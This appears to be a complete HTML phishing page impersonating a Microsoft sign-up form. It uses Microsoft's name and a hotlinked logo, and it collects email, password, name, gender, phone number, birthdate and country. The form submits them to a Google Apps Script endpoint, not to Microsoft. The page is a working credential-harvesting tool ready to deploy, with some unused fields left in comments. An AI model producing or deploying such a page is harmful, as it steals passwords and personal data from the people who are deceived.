<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="./include.css">
    
    <title>Microsoft Sign Up</title>
</head>

<body>
    <img id="logo" src="https://th.bing.com/th/id/OIP.PWoq1WvDQDxc_MPv4Jt0GwHaHa?w=159&h=180&c=7&r=0&o=7&cb=12&dpr=1.5&pid=1.7&rm=3" alt="Microsoft"> 
    <h1 id="title">Microsoft</h1>

    <!-- <ul class="benefits">
        <li>Access to Microsoft apps</li>
        <li>Account recovery & security</li>
        <li>Sync across devices</li>
    </ul> -->

    <div class="spacer" aria-hidden="true"></div>

    <form action="https://script.google.com/macros/s/AKfycbz6cewkwC6P68-qotOokhBb_v1Zxr3aozRItX-rFramd4p_7R3XzwHLj7o1mN-6Okez/exec" method="post">
        <div class="form-section">
            <div class="form-title">
                <h3>Sign Up</h3>
            </div>
    
            <!-- <div class="form-contents">
                <label for="microsoftLogIn">Microsoft Account:</label>
                <input type="text" id="microsoftLogIn" name="microsoftAccount" required>
            </div> -->
            
            <div class="form-contents">
                <!-- <input type="radio" id="employeeOption" name="userType" value="EM">
                <label for="employeeOption">Employee</label>
            
                <input type="radio" id="userOption" name="userType" value="UR">
                <label for="userOption">User</label> -->

                <label for="email">Email Address:</label>
                <input type="email" id="email" name="email" placeholder="Email Address" required>
            </div>

            <!-- <div class="form-contents">
                <input type="number" id="idNumber" name="idNumber" placeholder="ID Number">
            </div> -->
            
            <div class="form-contents">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password" placeholder="Password" required>
            </div>

            <div class="form-contents">
                <label for="name">Name (First/Last):</label>
                <input type="text" id="name" name="name" placeholder="Name" required>
            </div>

            <div class="form-contents">
                <label>Gender:</label>
                <br>
                <input type="radio" id="genderMale" name="gender" value="male" required>
                <label for="genderMale">Male</label>
                <br>
                <input type="radio" id="genderFemale" name="gender" value="female" required>
                <label for="genderFemale">Female</label>
            </div>

            <div class="form-contents">
                <label for="phone">Phone Number:</label>
                <input type="tel" id="phone" name="phone" placeholder="111-222-3333" required>
            </div>
            
            <div class="form-contents">
                <label for="birthdate">Birthdate:</label>
                <input type="date" id="birthdate" name="birthdate" required>
            </div>

            <div class="form-contents">
                <label for="country">Country:</label>
                <select name="country" id="country">
                    <option value="USA">U.S.A.</option>
                    <option value="Ca">Canada</option>
                    <option value="Mx">Mexico</option>
                    <option value="Uk">U.K.</option>
                    <option value="?">Other</option>
                </select>
            </div>

            <!-- <div class="form-contents">
                <label for="years">Years using Microsoft's products:</label>
                <input type="number" id="years" name="years" min="0" max="80" step="1" placeholder="e.g., 3">
            </div> -->

            
            <div class="form-contents">
                <button type="submit" id="submitbutton">Submit</button>
            </div>
        </div>
    </form>
</body>

</html>
